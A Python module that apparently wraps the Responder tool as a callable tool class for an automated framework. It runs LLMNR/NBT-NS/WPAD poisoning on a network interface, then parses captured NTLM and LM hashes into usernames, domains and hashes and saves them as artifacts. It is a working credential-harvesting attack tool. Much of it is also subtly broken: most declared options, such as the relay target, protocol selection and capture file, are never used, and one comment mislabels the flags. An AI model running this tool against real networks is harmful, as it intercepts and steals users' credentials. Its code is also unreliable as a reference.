"""Responder tool implementation for LLMNR/NBT-NS poisoning and credential harvesting."""

from __future__ import annotations

import os
import subprocess
import time
from enum import Enum
from typing import List, Optional, Literal, Dict, Any

from pydantic import Field

from ...base_tool import BaseTool
from ...schemas import BaseToolArgs, ToolResult


class ResponderMode(str, Enum):
    """Supported Responder modes."""
    
    POISON = "poison"
    ANALYZE = "analyze"
    RELAY = "relay"
    CAPTURE = "capture"
    DUMP = "dump"


class Protocol(str, Enum):
    """Supported protocols for poisoning."""
    
    LLMNR = "LLMNR"
    NBT_NS = "NBT-NS"
    MDNS = "mDNS"
    DNS = "DNS"
    DHCP = "DHCP"


class ResponderArgs(BaseToolArgs):
    """Arguments for the Responder tool."""
    
    mode: ResponderMode = Field(
        ResponderMode.POISON,
        description="Responder mode to execute"
    )
    
    # Interface and network options
    interface: Optional[str] = Field(
        None,
        description="Network interface to use"
    )
    ip_address: Optional[str] = Field(
        None,
        description="IP address to bind to"
    )
    
    # Protocol options
    protocols: Optional[List[Protocol]] = Field(
        None,
        description="Protocols to poison (LLMNR, NBT-NS, mDNS, DNS, DHCP)"
    )
    
    # Poisoning options
    poison_all: bool = Field(
        True,
        description="Poison all protocols"
    )
    challenge: Optional[str] = Field(
        None,
        description="Challenge to use for authentication"
    )
    
    # Relay options
    relay_target: Optional[str] = Field(
        None,
        description="Target for relay attacks"
    )
    relay_credential: Optional[str] = Field(
        None,
        description="Credential to use for relay"
    )
    
    # Capture options
    capture_file: Optional[str] = Field(
        None,
        description="File to save captured credentials"
    )
    capture_format: Literal["json", "xml", "csv", "raw"] = Field(
        "json",
        description="Format for captured credentials"
    )
    
    # Analysis options
    analyze_file: Optional[str] = Field(
        None,
        description="File to analyze for credentials"
    )
    
    # Output options
    output_file: Optional[str] = Field(
        None,
        description="Output file path"
    )
    log_file: Optional[str] = Field(
        None,
        description="Log file path"
    )
    
    # Execution options
    verbose: bool = Field(
        False,
        description="Enable verbose output"
    )
    debug: bool = Field(
        False,
        description="Enable debug mode"
    )
    quiet: bool = Field(
        False,
        description="Suppress output"
    )
    
    # Timeout and execution
    timeout: int = Field(
        30,
        description="Maximum execution time in seconds"
    )


def parse_responder_output(output_text: str) -> Dict[str, Any]:
    """Parse Responder output into structured metadata."""
    
    metadata: Dict[str, Any] = {
        "captured_credentials": [],
        "poisoned_requests": [],
        "relay_attempts": [],
        "protocols_active": [],
        "summary": {
            "total_credentials": 0,
            "total_requests": 0,
            "total_relays": 0,
            "protocols_poisoned": []
        }
    }
    
    try:
        lines = output_text.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Parse captured credentials
            if "hash" in line.lower() and ":" in line:
                if "ntlm" in line.lower() or "lm" in line.lower():
                    parts = line.split(":")
                    if len(parts) >= 3:
                        cred = {
                            "username": parts[0].strip(),
                            "domain": parts[1].strip() if len(parts) > 3 else "",
                            "hash": parts[-1].strip(),
                            "type": "NTLM" if "ntlm" in line.lower() else "LM"
                        }
                        metadata["captured_credentials"].append(cred)
                        metadata["summary"]["total_credentials"] += 1
            
            # Parse poisoned requests
            elif "poisoning" in line.lower() or "responding" in line.lower():
                if "llmnr" in line.lower() or "nbt-ns" in line.lower():
                    protocol = "LLMNR" if "llmnr" in line.lower() else "NBT-NS"
                    metadata["poisoned_requests"].append({
                        "protocol": protocol,
                        "raw_line": line
                    })
                    metadata["summary"]["total_requests"] += 1
                    if protocol not in metadata["summary"]["protocols_poisoned"]:
                        metadata["summary"]["protocols_poisoned"].append(protocol)
            
            # Parse relay attempts
            elif "relay" in line.lower():
                metadata["relay_attempts"].append({"raw_line": line})
                metadata["summary"]["total_relays"] += 1
            
            # Parse active protocols
            elif "listening" in line.lower() or "active" in line.lower():
                for protocol in ["LLMNR", "NBT-NS", "mDNS", "DNS", "DHCP"]:
                    if protocol.lower() in line.lower():
                        if protocol not in metadata["protocols_active"]:
                            metadata["protocols_active"].append(protocol)
    
    except Exception as e:
        metadata["parse_error"] = str(e)
    
    return metadata


class ResponderTool(BaseTool):
    """Responder tool for LLMNR/NBT-NS poisoning and credential harvesting."""
    
    args_model = ResponderArgs

    def build_command(self, args: ResponderArgs) -> List[str]:
        """Build responder command arguments.
        
        Args:
            args: Validated ResponderArgs
            
        Returns:
            List of command arguments for responder
        """
        cmd = ["responder"]
        
        # Add interface (required for responder)
        if args.interface:
            cmd.extend(["-I", args.interface])
        else:
            # Default to eth0 if not specified
            cmd.extend(["-I", "eth0"])
        
        # Responder mode controls which services to enable
        if args.mode == ResponderMode.ANALYZE:
            cmd.append("-A")  # Analyze mode
        
        # Add verbose flag for more output
        if args.verbose:
            cmd.append("-v")
        
        # Force WREDIR and NBTNS flags for better capture
        cmd.extend(["-w", "-F"])  # WPAD + Force capture
        
        return cmd

    def parse_output(
        self,
        stdout: str,
        stderr: str,
        exit_code: int,
        args: ResponderArgs,
    ) -> Dict[str, Any]:
        """Parse responder output into structured metadata."""
        if stdout:
            return parse_responder_output(stdout)
        return {}

    def create_artifacts(
        self,
        stdout: str,
        args: ResponderArgs,
        timestamp: Optional[int] = None,
    ) -> List[str]:
        """Create responder artifact files from output."""
        artifacts: List[str] = []
        if stdout and len(stdout) > 100:
            ts = timestamp if timestamp is not None else int(time.time())
            artifact_path = f"artifacts/responder_{ts}.txt"
            try:
                os.makedirs("artifacts", exist_ok=True)
                with open(artifact_path, "w", encoding="utf-8") as f:
                    f.write(stdout)
                artifacts.append(artifact_path)
            except Exception:
                pass
        
        # Add output files to artifacts
        if args.output_file and os.path.exists(args.output_file):
            artifacts.append(args.output_file)
        if args.capture_file and os.path.exists(args.capture_file):
            artifacts.append(args.capture_file)
        if args.log_file and os.path.exists(args.log_file):
            artifacts.append(args.log_file)
        
        return artifacts

    def run(self, args: ResponderArgs) -> ToolResult:
        cmd = self.build_command(args)
        
        start = time.time()
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=args.timeout,
            )
        except subprocess.TimeoutExpired:
            return ToolResult(
                success=False,
                exit_code=-2,
                stdout="",
                stderr="Command timed out",
                artifacts=[],
                metadata={},
                execution_time=time.time() - start,
            )
        
        metadata = self.parse_output(proc.stdout, proc.stderr, proc.returncode, args)
        artifacts = self.create_artifacts(proc.stdout, args, timestamp=int(start))
        
        return ToolResult(
            success=proc.returncode == 0,
            exit_code=proc.returncode,
            stdout=proc.stdout,
            stderr=proc.stderr,
            artifacts=artifacts,
            metadata=metadata,
            execution_time=time.time() - start,
        ) 